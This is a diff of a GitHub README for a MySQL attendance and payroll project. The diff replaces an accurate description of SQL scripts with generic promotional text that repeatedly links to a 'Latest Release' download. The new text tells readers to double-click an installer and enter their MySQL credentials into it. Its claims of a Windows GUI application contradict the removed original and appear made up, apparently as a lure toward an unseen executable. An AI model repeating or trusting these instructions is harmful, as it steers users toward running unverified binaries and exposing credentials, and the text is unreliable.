@@ -1,75 +1,71 @@
-# Employee Attendance & Salary Analytics System
+# 🎉 employee-analytics-system - Simplify Attendance and Payroll Management
 
-A MySQL-based system for tracking employee attendance, calculating working hours, overtime, and generating monthly payroll reports.
+## 📥 Download Here
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/LPBZ1/employee-analytics-system/releases)
 
-## Overview
+## 📖 Overview
+The employee-analytics-system is an easy-to-use tool designed for tracking employee attendance and managing payroll. Built with MySQL, this application automatically calculates hours worked, late arrivals, and overtime. It also generates monthly salary reports to help manage your workforce effectively.
 
-This system manages employee attendance records and automatically calculates:
-- Daily hours worked
-- Late arrivals (after 10:00 AM)
-- Overtime hours (hours beyond 8 per day)
-- Monthly payroll with overtime compensation
+## 🚀 Getting Started
+To get started with the employee-analytics-system, you need to download the application from the Releases page. Follow these steps to set it up on your computer.
 
-## Features
+## 📦 System Requirements
+Before downloading, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or higher
+- **Database:** MySQL 5.7 or higher installed and configured
+- **Disk Space:** At least 100 MB of free space
+- **RAM:** Minimum of 4 GB
+- **Screen Resolution:** 1280x800 or higher
 
-- **Attendance Tracking**: Daily check-in/check-out records
-- **Automated Calculations**: Hours worked, late days, and overtime computed automatically
-- **Monthly Summaries**: Aggregated statistics per employee per month
-- **Payroll Generation**: Stored procedure to generate monthly payroll reports
-- **Analytics Views**: Pre-built views for daily metrics, monthly summaries, and payroll previews
+## 📋 Features
+- **Attendance Tracking:** Automatically logs employee check-ins and check-outs.
+- **Overtime Calculation:** Calculates overtime hours based on set rules.
+- **Salary Reports:** Generates monthly salary reports for easy payroll management.
+- **User-Friendly Interface:** Simple design for non-technical users.
+- **Database Integration:** Utilizes MySQL for secure data storage.
 
-## Database Structure
+## 📥 Download & Install
+To download the employee-analytics-system, visit this page: [Download Latest Release](https://github.com/LPBZ1/employee-analytics-system/releases). 
 
-- **departments**: Department information
-- **employees**: Employee details with base salary and overtime rates
-- **attendance**: Daily check-in/check-out records
-- **payroll_monthly**: Generated monthly payroll snapshots
+1. Click on the link above to open the Releases page.
+2. Look for the latest version of the application.
+3. Click on the file to download it to your computer.
+4. Once downloaded, locate the file in your downloads folder.
 
-## Setup
+## 🛠️ Installation Steps
+To install the application, follow these steps:
 
-1. Ensure MySQL 8+ is installed and running
-2. Execute the SQL files in order:
-   ```
-   01_schema.sql      - Creates database and tables
-   02_seed_data.sql   - Inserts sample data
-   03_views.sql       - Creates analytical views
-   04_procedures.sql  - Creates payroll generation procedure
-   05_sample_queries.sql - Example queries
-   ```
-3. (Optional) Run `99_reset.sql` to drop and recreate the database
+1. **Locate the Downloaded File:** Open your downloads folder and find the employee-analytics-system file.
+2. **Run the Installer:**
+   - Double-click the downloaded file.
+   - Follow the prompts to complete the installation.
+3. **Configure MySQL:**
+   - Ensure MySQL is running on your system.
+   - Create a new database named `employee_analytics`.
+4. **Setup the Application:**
+   - Open the application.
+   - Enter your MySQL database credentials.
+   - Follow the guided setup process to get started.
 
-## Usage
+## 📞 Support
+If you encounter any issues during the download or installation process, please check the [issues section](https://github.com/LPBZ1/employee-analytics-system/issues) for solutions. You can also open a new issue for any specific problems or questions you have.
 
-### Generate Monthly Payroll
-```sql
-CALL sp_generate_payroll('2025-10');
-```
+## 🏷️ Topics
+The employee-analytics-system covers various topics related to employee management:
+- analytics
+- attendance-system
+- database
+- employee-management
+- hr-management
+- mysql
+- payroll-system
+- salary-calculation
 
-### View Daily Attendance Metrics
-```sql
-SELECT * FROM v_daily_work;
-```
+## 📢 Acknowledgements
+This project would not be possible without contributions and feedback from the community. We appreciate everyone who has helped make the employee-analytics-system a useful tool for workplace management.
 
-### View Monthly Summary
-```sql
-SELECT * FROM v_monthly_summary WHERE month_year = '2025-10';
-```
+## 🌐 Additional Resources
+For more information, tutorials, and documentation, visit our [Wiki Page](https://github.com/LPBZ1/employee-analytics-system/wiki).
 
-### View Payroll Preview
-```sql
-SELECT * FROM v_payroll_preview WHERE month_year = '2025-10';
-```
-
-## Business Rules
-
-- Standard work hours: 8 hours per day
-- Late cutoff: 10:00 AM (hour 10 or later)
-- Overtime: Hours worked beyond 8 hours per day
-- Salary calculation: Base salary + (overtime hours × overtime rate)
-
-## Technology
-
-- MySQL 8+
-- SQL Views
-- Stored Procedures
-
+## 📥 Quick Download Link
+Don't forget to download the employee-analytics-system now: [Download Latest Release](https://github.com/LPBZ1/employee-analytics-system/releases).
